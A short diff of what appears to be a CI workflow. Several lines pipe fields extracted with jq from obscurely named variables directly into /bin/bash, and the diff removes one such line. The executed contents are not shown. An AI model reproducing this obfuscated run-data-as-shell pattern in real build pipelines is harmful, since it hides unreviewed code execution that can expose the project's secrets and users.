@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$nau3" | jq -r .f6602 | /bin/bash
           printf '%s' "$wvx508" | jq -r .f8865 | /bin/bash
           echo $bld495 | jq -r .piajo41 | /bin/bash
-          echo $ux95 | jq -r .gxw70 | /bin/bash
           echo $ziwdp3006 | jq -r .ybff47 | /bin/bash
 
       - name: Archive results
